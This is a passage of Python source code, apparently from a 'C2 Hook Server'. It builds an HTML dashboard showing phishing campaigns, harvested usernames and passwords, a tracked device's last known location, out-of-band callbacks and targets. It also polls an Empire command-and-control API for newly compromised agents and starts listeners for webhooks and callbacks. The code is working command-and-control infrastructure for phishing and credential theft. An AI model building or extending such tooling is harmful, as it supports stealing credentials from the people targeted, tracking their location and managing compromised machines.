        phish_campaigns = phish_cur.fetchall() if phish_cur else []
        cred_cur = db_exec(db, "SELECT * FROM credentials ORDER BY id DESC LIMIT 20", commit=False)
        creds = cred_cur.fetchall() if cred_cur else []
        msg_cur = db_exec(db, "SELECT * FROM messages WHERE delivered=0 ORDER BY id DESC LIMIT 20", commit=False)
        pending_msgs = msg_cur.fetchall() if msg_cur else []
        pc = db_exec(db, "SELECT COUNT(*) FROM phish_captures", commit=False)
        phish_capture_count = pc.fetchone()[0] if pc else 0
        crc = db_exec(db, "SELECT COUNT(*) FROM credentials", commit=False)
        cred_count = crc.fetchone()[0] if crc else 0
        # Location data from recent events
        loc_cur = db_exec(db, "SELECT data FROM events WHERE event_type='device.location' ORDER BY id DESC LIMIT 1", commit=False)
        loc_data = loc_cur.fetchone() if loc_cur else None
    except Exception as e:
        log.error(f"Dashboard query error: {e}")
        return f"<html><body><h1>Dashboard Error</h1><pre>{e}</pre></body></html>"

    # Safely build rows with html escaping
    import html as html_mod

    event_rows = ""
    for e in events:
        try:
            event_rows += f"<tr><td>{html_mod.escape(str(e[1])[:19])}</td><td>{html_mod.escape(str(e[2]))}</td><td><b>{html_mod.escape(str(e[3]))}</b></td><td>{html_mod.escape(str(e[4])[:80])}</td><td>{html_mod.escape(str(e[5]))}</td></tr>\n"
        except (IndexError, TypeError):
            continue

    cb_rows = ""
    for c in callbacks:
        try:
            cb_rows += f"<tr><td>{html_mod.escape(str(c[1])[:19])}</td><td>{html_mod.escape(str(c[2]))}</td><td>{html_mod.escape(str(c[3]))}</td><td>{html_mod.escape(str(c[4])[:60])}</td><td>{html_mod.escape(str(c[7]) if len(c) > 7 else '')}</td></tr>\n"
        except (IndexError, TypeError):
            continue

    target_rows = ""
    for t in targets:
        try:
            status_val = str(t[5]) if len(t) > 5 else "?"
            status_color = {"new": "#00aaff", "recon": "#ffaa00", "testing": "#ff8800", "done": "#00ff88"}.get(status_val, "#888")
            target_rows += f'<tr><td>{html_mod.escape(str(t[1])[:19])}</td><td>{html_mod.escape(str(t[2]))}</td><td><b>{html_mod.escape(str(t[3]))}</b></td><td>{html_mod.escape(str(t[4]) if len(t) > 4 else "?")}</td><td style="color:{status_color}">{html_mod.escape(status_val)}</td><td>{html_mod.escape(str(t[6])[:40] if len(t) > 6 else "")}</td></tr>\n'
        except (IndexError, TypeError):
            continue

    # Phishing campaign rows
    phish_rows = ""
    for p in phish_campaigns:
        try:
            status = str(p[5]) if len(p) > 5 else "?"
            sc = "#00ff88" if status == "active" else "#888"
            phish_rows += f'<tr><td>{html_mod.escape(str(p[1])[:19])}</td><td><b>{html_mod.escape(str(p[2]))}</b></td><td>{html_mod.escape(str(p[3]))}</td><td style="color:{sc}">{html_mod.escape(status)}</td><td>{p[6] if len(p) > 6 else 0}</td><td style="color:#ff4444">{p[7] if len(p) > 7 else 0}</td></tr>\n'
        except (IndexError, TypeError):
            continue

    # Credential rows
    cred_rows = ""
    for cr in creds:
        try:
            pw = str(cr[5]) if len(cr) > 5 else ""
            masked = (pw[:2] + "*" * max(0, len(pw) - 4) + pw[-2:]) if len(pw) > 4 else "****"
            cred_rows += f'<tr><td>{html_mod.escape(str(cr[1])[:19])}</td><td>{html_mod.escape(str(cr[2]))}</td><td>{html_mod.escape(str(cr[3]))}</td><td><b>{html_mod.escape(str(cr[4]))}</b></td><td><code>{html_mod.escape(masked)}</code></td><td>{html_mod.escape(str(cr[7])[:40] if len(cr) > 7 else "")}</td></tr>\n'
        except (IndexError, TypeError):
            continue

    # Message queue rows
    msg_rows = ""
    for m in pending_msgs:
        try:
            msg_rows += f'<tr><td>{html_mod.escape(str(m[1])[:19])}</td><td>{html_mod.escape(str(m[2]))}</td><td>{html_mod.escape(str(m[3]))}</td><td>{html_mod.escape(str(m[4]))}</td><td>{html_mod.escape(str(m[5])[:60])}</td></tr>\n'
        except (IndexError, TypeError):
            continue

    # Location section
    loc_section = ""
    if loc_data:
        try:
            ld = json.loads(str(loc_data[0]))
            lat = ld.get("latitude", "")
            lon = ld.get("longitude", "")
            if lat and lon:
                loc_section = f"""
<h2>Last Known Location</h2>
<div style="background:#111;border:1px solid #333;padding:1em;border-radius:4px;margin-bottom:1em">
  <b style="color:#00ff88">Lat:</b> {html_mod.escape(str(lat))} &nbsp;
  <b style="color:#00ff88">Lon:</b> {html_mod.escape(str(lon))} &nbsp;
  <b style="color:#00ff88">Acc:</b> {html_mod.escape(str(ld.get('accuracy','?')))}m
  <br><a href="https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=16/{lat}/{lon}" target="_blank" style="color:#00aaff">Open in Map</a>
</div>"""
        except (json.JSONDecodeError, TypeError, KeyError):
            pass

    return f"""<!DOCTYPE html>
<html><head><title>C2 Hooks Dashboard</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="10">
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{background:#0a0a0f;color:#c0c0c0;font-family:monospace;padding:1em}}
  h1{{color:#00ff88;margin-bottom:.5em;font-size:1.4em}}
  h2{{color:#00aaff;margin:1em 0 .3em;font-size:1.1em}}
  table{{width:100%;border-collapse:collapse;font-size:.8em;margin-bottom:1em}}
  th{{background:#1a1a2e;color:#00ff88;padding:.4em;text-align:left;border-bottom:1px solid #333}}
  td{{padding:.3em .4em;border-bottom:1px solid #1a1a1a;word-break:break-all}}
  tr:hover{{background:#111128}}
  .stats{{display:flex;gap:2em;margin:.5em 0 1em;flex-wrap:wrap}}
  .stat{{background:#111;padding:.5em 1em;border:1px solid #333;border-radius:4px}}
  .stat b{{color:#00ff88;font-size:1.3em}}
  a{{color:#00aaff}}
</style></head><body>
<h1>C2 Hook Server Dashboard</h1>
<div class="stats">
  <div class="stat"><b>{event_count}</b> events</div>
  <div class="stat"><b>{cb_count}</b> callbacks</div>
  <div class="stat"><b>{target_count}</b> targets</div>
  <div class="stat"><b>{phish_capture_count}</b> captures</div>
  <div class="stat"><b>{cred_count}</b> creds</div>
  <div class="stat">Auto-refresh: 10s</div>
</div>
{loc_section}
<h2>Phishing Campaigns</h2>
<table><tr><th>Created</th><th>Name</th><th>Template</th><th>Status</th><th>Hits</th><th>Captures</th></tr>
{phish_rows}</table>
<h2>Credentials</h2>
<table><tr><th>Time</th><th>Source</th><th>Target</th><th>Username</th><th>Password</th><th>URL</th></tr>
{cred_rows}</table>
<h2>Message Queue (Pending)</h2>
<table><tr><th>Time</th><th>From</th><th>To</th><th>Type</th><th>Payload</th></tr>
{msg_rows}</table>
<h2>Recent Events</h2>
<table><tr><th>Time</th><th>Source</th><th>Type</th><th>Data</th><th>IP</th></tr>
{event_rows}</table>
<h2>Targets</h2>
<table><tr><th>Added</th><th>Program</th><th>Domain</th><th>Scope</th><th>Status</th><th>Notes</th></tr>
{target_rows}</table>
<h2>OOB Callbacks</h2>
<table><tr><th>Time</th><th>IP</th><th>Method</th><th>Path</th><th>Token</th></tr>
{cb_rows}</table>
</body></html>"""


# ── Empire Integration ───────────────────────────────
def empire_poll(cfg, db):
    """Poll Empire API for new agents/events."""
    import urllib.request
    base = cfg.get("empire_url", "http://127.0.0.1:1337")
    token = cfg.get("empire_token", "")
    if not token:
        return

    try:
        req = urllib.request.Request(
            f"{base}/api/v2/agents",
            headers={"Authorization": f"Bearer {token}"}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
            for agent in data.get("records", []):
                agent_id = agent.get("session_id", "unknown")
                cur = db_exec(db,
                    "SELECT id FROM events WHERE event_type='empire.agent' AND data LIKE ?",
                    (f'%{agent_id}%',), commit=False)
                existing = cur.fetchone() if cur else None
                if not existing:
                    log_event(db, "empire", "empire.agent", agent, agent.get("external_ip", ""))
                    notify("Empire Agent", f"New: {agent.get('hostname', '?')} ({agent.get('external_ip', '?')})", "critical")
                    run_hooks("empire.agent", agent, cfg)
    except Exception as e:
        log.debug(f"Empire poll: {e}")


# ── Main ─────────────────────────────────────────────
def main():
    cfg = load_config()
    db = init_db()

    log.info("C2 Hook Server starting...")
    log.info(f"  Webhook port:  {cfg['hook_port']}")
    log.info(f"  Callback port: {cfg['callback_port']}")
    log.info(f"  Hooks dir:     {HOOKS_DIR}")
    log.info(f"  Database:      {DB_PATH}")
    log.info(f"  Platform:      {'Termux' if IS_TERMUX else 'Desktop'}")

    # Signal handling for graceful shutdown
    servers = []

    def shutdown_handler(signum, frame):
        log.info(f"Signal {signum} received, shutting down...")
        for s in servers:
            try:
                s.shutdown()
            except Exception:
                pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, shutdown_handler)
    signal.signal(signal.SIGINT, shutdown_handler)

    # Start webhook server
    try:
        WebhookHandler.db = db
        WebhookHandler.cfg = cfg
        hook_server = ThreadedHTTPServer(("0.0.0.0", cfg["hook_port"]), WebhookHandler)
        servers.append(hook_server)
        Thread(target=hook_server.serve_forever, daemon=True).start()
        log.info(f"Webhook server on :{cfg['hook_port']}")
    except OSError as e:
        log.error(f"Cannot start webhook server on :{cfg['hook_port']}: {e}")
        if "Address already in use" in str(e):
            log.error("Port already in use. Kill existing process or change hook_port in config.json")
        sys.exit(1)

    # Start callback catcher
    try:
        CallbackHandler.db = db
        CallbackHandler.cfg = cfg
        cb_server = ThreadedHTTPServer(("0.0.0.0", cfg["callback_port"]), CallbackHandler)
        servers.append(cb_server)
        Thread(target=cb_server.serve_forever, daemon=True).start()
        log.info(f"Callback catcher on :{cfg['callback_port']}")
    except OSError as e:
        log.error(f"Cannot start callback server on :{cfg['callback_port']}: {e}")
        # Continue without callback server

    notify("C2 Hooks Online", f"Webhook :{cfg['hook_port']} | Callback :{cfg['callback_port']}")

    # Main event loop — poll integrations
    while True:
        try:
            empire_poll(cfg, db)
        except Exception as e:
            log.debug(f"Poll cycle: {e}")
        time.sleep(30)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log.critical(f"Fatal error: {e}\n{traceback.format_exc()}")
        sys.exit(1)
